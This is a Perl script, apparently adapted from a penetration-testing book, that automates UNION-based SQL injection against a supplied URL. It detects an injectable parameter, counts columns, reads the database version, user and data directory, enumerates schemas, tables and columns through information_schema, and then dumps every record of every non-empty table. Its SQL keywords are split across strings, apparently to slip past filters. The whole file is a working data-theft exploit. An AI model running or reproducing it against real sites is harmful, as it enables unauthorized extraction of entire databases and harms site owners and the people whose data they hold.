#!/usr/bin/perl

# This perl script was based on the Book: 'Penetration Testing with Perl' By Douglas Berdeaux
# I ripped off the code and modified it to make it somehow "automated"
# I've been tired and didn't bother to finish it.
# Limitations: Can't exploit string UNION-BASED SQLi, Blind-SQLi, EROR-BASED SQLi
# Written by Jcynth Tingson <jcynth.tingson@gmail.com>.

use strict;
use warnings;
use LWP::UserAgent;
use Cwd qw( abs_path );
use File::Basename qw( dirname );
use lib dirname(abs_path($0));

use SQLData qw<$ua $loopflag>;
my $url = shift;
my $port = shift;

print SQLData::getWebServer($url, $port);

my $res = SQLData::parsePage(SQLData::fetchPage($url,"checkvulnerable",0));
#loop flag to true!
$loopflag = 1;
if($res =~ /positive/i){
    print "We have detected an SQLi vulnerability...\n";
    print "Counting columns...\n";
    my $colCount = SQLData::colCount($url,5,0);
    print "Column count: " . $colCount, "\n";
    my($injCol, $injString) = split("---", SQLData::injColumn($url,$colCount));

    print "DB Version: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(@@version)'));
    print "\n------\n";
    print "Server FS: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(@@datadir)'));
    print "\n------\n";
    print "User: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(user())'));
    print "\n------\n";
    print "System User: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(system_user())'));
    print "\n------\n";
    print "Database: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(database())'));
    print "\n------\n";
    my @databases = split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcolDodge", "(select group_concat(distinct table_schema SEPARATOR ',') from information_schema.tables)")));

    foreach my $db(@databases){
        next if $db =~ /phpmyadmin/;
        print "Accessible DB: ", $db, "\n";
        print "Accessible Table: ", $_, "\n" foreach(split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcolDodge",
        "(select group_concat(distinct table_name SEPARATOR ',') from information_schema.tables where table_schema = " . "'$db')"))));
        print "[--------------]\n";
        
    }
    my $queryRecSTR = "(select "
                ."-COL- from (select \@r:=\@r%2b1 as gid,-COL- from ("
                ."select \@r:=0) r,-TBL- p) k where gid = -INT-)";
    #my $inj = modifyInjectionString($var, 4, 2);
    my $queryRec = " union select ".SQLData::modifyInjectionString($queryRecSTR, $colCount, $injCol)."--";
    my $queryCountSTR = "(selec"
    ."t count(*) from -TBL-)";
    my $queryCount = " union select ".SQLData::modifyInjectionString($queryCountSTR, $colCount, $injCol)."--";
    my $tableCountSTR = "(selec"
    ."t count(table_name) from information_schema.tables "
    ."where table_rows > 0)";
    my $tableCount = " union select ".SQLData::modifyInjectionString($tableCountSTR, $colCount, $injCol)."--";
    my $columnCountSTR = "(sele"
    ."ct count(column_name) from information_schema.colum"
    ."ns where table_name = '-TBL-')";
    my $columnCount = " union select ". SQLData::modifyInjectionString($columnCountSTR, $colCount, $injCol) ."--";
    my $tableNameSTR = "(select"
    ." table_name from (select \@r:=\@r%2b1 as gid,table_"
    ."name from (select \@r:=0) r,information_schema.tabl"
    ."es p where table_rows > 0) k where gid = -INT-)";
    my $tableName = " union select ". SQLData::modifyInjectionString($tableNameSTR, $colCount, $injCol) ."--";
    my $columnNameSTR = "(selec"
    ."t column_name from (select \@r:=\@r%2b1 as gid,colu"
    ."mn_name from (select \@r:=0) r,information_schema.c"
    ."olumns p where table_name = '-TBL-') k where gid = "
    ."-INT-)";
    my $columnName = " union select ". SQLData::modifyInjectionString($columnNameSTR, $colCount, $injCol) ."--";
    my $host = "http://".$url;
    #print $host . "\n";
    my $totalTables = SQLData::parsePage(SQLData::fetchPage($host.$tableCount, "directnoinject", 0));

    #print $totalTables . "\n";

    my @tables;
    my @metadata;

    for(my $i=1;$i<=$totalTables;$i++){
        (my $tableNameInt = $tableName) =~ s/-INT-/$i/;
        push(@tables, SQLData::parsePage(SQLData::fetchPage($host.$tableNameInt,"directnoinject", 0)));
    }
    foreach my $tbl(@tables){
        my $metaString = $tbl.",";
        (my $url = $host.$columnCount) =~ s/-TBL-/$tbl/;
        my $c = SQLData::parsePage(SQLData::fetchPage($url, "directnoinject", 0));
        for(my $i=1;$i<=$c;$i++){
            ($url = $host.$columnName) =~ s/-INT-/$i/;
            $url =~ s/-TBL-/$tbl/;
            $metaString .= SQLData::parsePage(SQLData::fetchPage($url, "directnoinject", 0));
            $metaString .= "," unless($i == $c);
        }
        push(@metadata,$metaString);
    }

    print $_, "\n" foreach(@metadata);
    foreach my $mdata(@metadata){
        my $recCount = 0;
        my @ms = split(",", $mdata);
        my $tbl = shift @ms;
        (my $recs = $queryCount) =~ s/-TBL-/$tbl/;
        my $url = $host.$recs;
        $recCount = SQLData::parsePage(SQLData::fetchPage($url, "directnoinject", 0));
        next if $recCount < 1; #skip tables that has no record count
        print "Table: ", $tbl, " has record count of: ", $recCount, "\n";
        $url = $host.$queryRec;
        (my $tUrl = $url) =~ s/-TBL-/$tbl/;
        for(my $i=1;$i<=$recCount;$i++){
            (my $rTurl = $tUrl) =~ s/-INT-/$i/;
            foreach my $col(@ms){
                (my $cTUrl = $rTurl) =~ s/-COL-/$col/g;
                print SQLData::parsePage(SQLData::fetchPage($cTUrl, "directnoinject", 0)), " ";
                #print $cTUrl . "\n";exit;
            }
            print "\n";
        }
    }    
}
print "\n";